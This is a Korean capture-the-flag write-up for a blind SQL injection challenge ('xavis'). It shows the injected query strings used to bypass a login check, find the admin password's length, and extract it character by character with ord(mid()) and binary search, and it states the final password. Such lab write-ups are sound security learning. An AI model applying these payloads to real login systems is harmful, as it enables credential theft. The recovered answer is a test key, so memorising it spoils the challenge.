## Q19. xavis _ 비밀번호 획득 우회(문자)
<img src="/photo/prob_19.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: regex / like <br> 문제 사항: admin의 패스워드 찾기
### 해결책

```
먼저 쿼리가 참이 되는 결과를 알아봄
=> and 조건 피하도록 || 이용
```
```diff
# 현재 쿼리문: where id='admin' and pw=''||1-- '
```
```
패스워드를 찾아야해서 패스워드 길이를 찾아봄
=> length()함수 사용
=> 숫자 증가시키는 파이썬 코드를 이용함
=> 밑의 쿼리가 참이므로 패스워드 길이 = 12
```
```diff
# 현재 쿼리문: where id='admin' and pw=''||length(pw)=12-- '
```
<참고> Python 코드 : [패스워드 길이 탐색](code/19_pwlength.py)
```
다음으로 패스워드 각자리의 문자 확인
=> substr()함수를 이용
비교를 쉽게 하기 위해 ascii()함수를 이용
but. 제한 되지 않았음에도 불구하고 이용 못함
```
```diff
# 현재 쿼리문: where id='admin' and pw=''||ascii(substr(pw,1,1))<1-- '
```
```
ascii 대신 ord 사용 가능
=> ord를 이용해 먼저 참으로 만들어봄 
=> 참인 숫자가 너무 큼
=> 이진 탐색 방법으로 직접 찾아봄
```
```diff
# 현재 쿼리문: where id='admin' and pw=''||ord(mid(pw,1,1))<50865-- '
```
```
해결 쿼리문: where id='admin' and pw='우왕굳'
```
### CERT <br> Python 코드 : [패스워드 길이 탐색](code/19_pwlength.py)

### 느낀점
```diff
+ 1. ascii(), ord() 함수를 자세히 배울 수 있었다.
+ ascii(): 2byte 이상 값 반환 X
+ ord(): 2byte 이상 값 반환

+ 2. DB에 저장된 것의 바이트 값에 대해 새롭게 배웠다.
+ 문자, 숫자: 1byte 차지
+ 한글: 3byte(utf - 8), 4byte(utf)
```
